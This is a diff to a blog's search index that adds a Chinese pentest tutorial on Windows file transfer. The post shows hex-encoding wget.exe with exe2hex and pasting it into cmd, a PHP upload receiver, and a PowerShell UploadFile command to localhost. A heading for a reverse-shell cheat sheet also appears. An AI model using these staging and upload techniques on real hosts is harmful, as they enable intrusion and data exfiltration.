@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>Windows文件传输</title>
+      <link href="2021/04/05/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
+      <url>2021/04/05/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
+      
+        <content type="html"><![CDATA[<p>测试文件：wget.exe 302kb</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>hex编码exe文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe2hex wget.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405173228000.png" alt="image-20210405173228000"></p><p>复制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat nc.cmd | xclip -selection clipboard</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405173309408.png" alt="image-20210405173309408"></p><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405173325112.png" alt="image-20210405173325112"></p><p>cmd粘贴执行</p><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405173409587.png" alt="image-20210405173409587"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>服务器 请勿将文件上传到有php执行权限的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">move_upload_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],&#39;U:\data_file\&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405175010418.png" alt="image-20210405175010418"></p><p>客户机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#39;, &#39;wget.exe&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405175104272.png" alt="image-20210405175104272"></p><p>传输完成</p><p><img src="https://raw.githubusercontent.com/magisec/images/main/image-20210405175157956.png" alt="image-20210405175157956"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>反弹shell备忘录</title>
       <link href="2021/04/05/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/"/>
       <url>2021/04/05/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/</url>
